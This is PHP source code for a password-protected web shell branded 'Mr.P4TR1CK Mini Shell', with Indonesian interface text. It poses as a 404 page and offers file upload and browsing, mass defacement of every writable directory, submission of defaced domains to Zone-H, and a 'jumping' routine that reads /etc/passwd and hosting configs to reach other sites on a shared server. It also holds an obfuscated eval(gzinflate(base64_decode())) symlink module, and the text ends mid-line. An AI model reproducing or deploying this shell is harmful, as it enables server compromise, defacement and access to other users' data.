<?php 

error_reporting(0);
header('HTTP/1.0 404 Not Found', true, 404);
session_start();
$pass = "ptrck404";
$link = "fvck.txt";
if($_POST['password'] == $pass) {
  $_SESSION['forbidden'] = $pass;
  echo "<script>window.location=Mini Shell</script>";
}
if($_GET['page'] == "blank") {
  echo "<a href='?'>Back</a>";
  exit();
}
if(isset($_REQUEST['logout'])) {
  session_destroy();
  echo "<script>window.location='?MINI SH3LL Mr.P4TR1CK'</script>";
}
if(!($_SESSION['forbidden'])) {
?>
<title>..:: Mr.P4TR1CK Shell ::..</title>
<meta name="theme color" content="black"> </meta>
<link href="https://fonts.googleapis.com/css?family=Patrick+Hand" rel="stylesheet">
<link href="https://fonts.googleapis.com/css2?family=Amatic+SC:wght@700&display=swap" rel="stylesheet" type='text/css'>
<link href="https://fonts.googleapis.com/css?family=Shadows+Into+Light+Two" rel="stylesheet">
<link rel="icon" type="image/png" href="https://i.pinimg.com/originals/f4/35/22/f43522bf3b4bbe2ed9927c250467bd3b.jpg" type="image/x-icon"/>


<html>
<head>
	<title>..:: Mr.P4TR1CK Shell ::..</title>
	<link rel="icon" type="image/png" href="https://i.pinimg.com/originals/f4/35/22/f43522bf3b4bbe2ed9927c250467bd3b.jpg" type="image/x-icon"/>
</head>
<style>
	input { margin:0;background-color:#fff;border:1px solid #fff; }
</style>
<body bgcolor="black">
<br><br><br><center><img src="https://media1.tenor.com/images/4fbc806e7edfa4b0323599dfc2c16d2c/tenor.gif?itemid=16539847" style="opacity:0.5; width:300px; height:300px";></center>
	<center><center><font color="red" face="Patrick Hand" size="10px">--==Mini Shell By</font><font color="white" face="Patrick Hand" size="10px"> Mr.P4TR1CK==--</font><br>

</center>
<br>

	<form method="post">
		<input type="password" name="password" placeholder="Bismillah"
      <input type="submit" value="">
		<br>
		<br>
		<?php echo $_SESSIOM['forbidden']; ?>
	    </form>
	  </td>
	 </table>
<center><audio src="https://g.top4top.net/m_1438oc8ui1.mp3" controls></audio></center>
<center>
<h1>
<center>
<font color="white" face="Patrick Hand" size="4px">Berdoa Dulu</font><font color="white" face="Patrick Hand" size="4px">Sebelum Login:)</font><br>


<?php 

exit();
}
 ?>
<?php
error_reporting(0);
set_time_limit(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<html>
<head>
<script src="https://cdn.rawgit.com/bungfrangki/efeksalju/2a7805c7/efek-salju.js" type="text/javascript"></script><link rel="icon" type="image/png" href="https://i.pinimg.com/originals/f4/35/22/f43522bf3b4bbe2ed9927c250467bd3b.jpg" type="image/x-icon"/>
<link href="https://fonts.googleapis.com/css?family=Supermercado+One&display=swap" rel="stylesheet">
<title>404 Not Found</title>
<style>
body{
font-family:Supermercado One, sans-serif;
background-color: Black;
background-image: url();
background-size: center; background-repeat:no-repeat; background-attachment: fixed; background-size: cover; background-position:center;
color: white;
}
#content tr:hover{
background-color: black;
text-shadow:0px 0px 10px black;
}
#content .first{
background-color: white;
}
table{
border: 1px #000000 dotted;
}
a{
color: aqua;
text-decoration: none;
}
a:hover{
color:blue;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
.lazy {
  margin: 0;
  font-family:Supermercado One;
}
</style>
</head>
<body>
<h1><center><img src="https://i.ya-webdesign.com/images/anime-dance-gif-png-19.gif" height="350 width="350"><center><audio src="https://g.top4top.net/m_1438oc8ui1.mp3" controls></audio></center><font color="red" face=""><div class="lazy"> [ Mr.P4TR1CK</font><font face=""> Shell ]<div class="lazy"></center></h1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font color="white">Path :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="white">Berhasil Om!!</font><br />';
}else{
echo '<font color="red">Gagal Om!!</font><br/>';
}
}
	if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$kernel = php_uname();
$ip_web = gethostbyname($_SERVER['HTTP_HOST']);
$ds = @ini_get("disable_functions");
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=aqua>Clear</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
echo "Disable Functions : $show_ds<br>";
echo "Systemnya : <font color=aqua>".$kernel."</font><br>";
echo "Ip Lu : <font color=aqua>".$ip_web."</font><br>";
echo "<center>";
echo "<hr>";
echo "[ <a href='?'>Home</a> ]";
echo "[ <a href='?dir=$dir&to=zoneh'>Zone-H </a> ]";
echo "[ <a href='?dir=$dir&to=jumping'>Jumping </a> ]";
echo "[ <a href='?dir=$dir&to=sym'>Symlink </a> ]";
echo "[ <a href='?dir=$dir&to=mass'>Mass Depes </a> ]";
echo "[ <a href='?dir=$dir&to=cmd'>Command </a> ]";
echo "</center>";
echo "<hr>";
if($_GET['to'] == 'zoneh') {
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=lime>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR SU</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value=INDONESIAN CYBER JAWA><br>
		<u>Domains</u>: <br>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>";
	}
	echo "</center>";
} elseif($_GET['to'] == 'mass') {
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=green>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "<form method='post'>
	<font style='text-decoration: underline;'>Tipe Mass:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked>Biasa<input type='radio' name='tipe_sabun' value='mahal'>Massa|SADIS<br>
	<font style='text-decoration: underline;'>Folder:</font><br>
	<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<input type='text' name='d_file' value='G.php' style='width: 450px;' height='10'><br>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Mr.P4TR1CK</textarea><br>
	<input type='submit' name='start' value='GASS !!' style='width: 450px;'>
	</form></center>";
	} 
	}elseif($_GET['to'] == 'sym') {
echo '<hr>';
eval(gzinflate(base64_decode('7Vf/T9tGFP89Uv6H1yOT7ZHaSRBrReKUrjCt0lakAtskqCLHPmOPi8+6u2BSyv++d+fYpE4AlVbaJhWJyHnf/b583ksnnjMGPkglJoLmLAip3ZkcH77/4/D9mXVw9Ob098N3J5P3R0cn1ocuENKFTh6oxBm2W52oNwvSTKL6fpwyahOPqtDLghmN3JBnMdFSW1uJUmhWtltpbFc6zk27tT+7jFJhk4iGwWIiFzPS7b148UIr7YdJg2Wo9JqGNmEZPJfggeBcGXpHe9/BMKyjXKUcI3qbRSgr4RfOGC+OF7Pf0uwSIzhIBQ0VFwsjAMa8m6hZu/U6ik4WOQVFr5WHeUgzcPMkB8P5NcgiRkWT2W4dByqV8QJeZwvLBJLrMGKe08y20HAQ4otLq2sVVhloYfiFSBXmGaW7ZezOcD8OGZclUYvSMOFA2q2RCqaMQsDSi8wPaaYwjCkXERX+DlZtwahvFWmkkr2fej8MS87zkDMu9rZe/tzDv6E11maE+Yw+szQexTxTYMR9ls4oyPQj9QfjYxfecXfkafZ45KnoS5QPuCnxE7VPJRVP1cVCMyx0Q9vDdyemX0M+Rz0f+vgt5oIGYVJ3JAQSls+6ObFXqaAXqU0+8oySbsVybnIkT2aBCpNJwJhtbWkBILb7o0O2rG5lRD+UidDljNlcJrZ+QsM4bAwbRIl0ZldCZ/0PZ70PjgNjGGj/nTnmAUPNuUyvJxdU5cU8jWwzaLzIqFhO2xUmJpBUesRtmqq7CIvfyB8mpszhMnEEXKjS46LCPelnNEZqAImgsY9jne95XlEUbtO3S7yqRiyQ0lfXarwuU3sJVjxpOf3qZ5bGEcuI1bzKtdXRsOXV6OBpKPASPqPemrqXz6csDSc45cwCFQjMpW9NpizILq21KJsdtAxt2UOwWshlvra3h7e3t3WqPTOvpt9uKZNUl/Lk8PjELyHSMkXL0V0RWWU7gG0EnoSI/3VAhMcQER6AROQ2UREqWIQHcLE/LtEO7sEN0/M7GzHuEZUN2PSYk3VEqvEIPgckMO9dJ4usdApuXSKIA1wAvU6VTU4z8/aKg5YFrfjMVB6KRLfZs5hyXLaa7ujGgo7e0jG2vlxSjUODYlSzAiGChV1SdUB3IIcte+4huL1yzvfOPU9qhJPdWrdpaPWQIOVEdvFqqCRw9o3GHQrWhhD5+gP49AnWGL4PPc24c+MDmaYZWSPqlP3V73uxXOddBcJj6dTL7mMGIi80aTP3gucJFes8uTEQYy+arTPmEk0hNN0TQ6zyzW+VbWJoDcTfzQxzhxEHk423mEqzOb0bID0gDzXuho3wYLevwLzWq0KpFMmq50cMVBj/AMQ3XKwi/BrA1wMY3DN9Gr9rlKkmownmJZTr+5VLeIYJ/jPNIl5I4tzci9mbEFtfsGt4fYfW6PkLAbvXe/kNoLrd+mqwfgCpq0Ing2WZrcsBYzs70aAuDxxTcUXFyEsG428C7m8P/lVgV3SWY6IIGXbwQOvjY888DTTW65schfAAtZfskQ+GW37d3nbgpoPXnv5h1bj/jMASQfFwQJJTOnN9+JunWLY9q2vILjnPsHGrSlijqfDG1rAKrTw+9ZdlA+4i0URllo+iUrk4jgjeRblY4nxeLY/d7lJRk1dGZxdNray0ap9tsvpV+2x9mX2bTfZ9jX1fY//nNdYYxw2bbORF6RV+LoMmw3mmza5MplG6Bb3v4E59EwK+CbKM4yvjz2hFoYmHtQdtrvx/Nf4H')));
} elseif($_GET['to'] == 'jumping') {
	$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts|vhost/", $dir)) {
		preg_match("/\/var\/www\/(.*?)\//", $dir, $vh);
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace("www.", "", $url);
				$web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type=
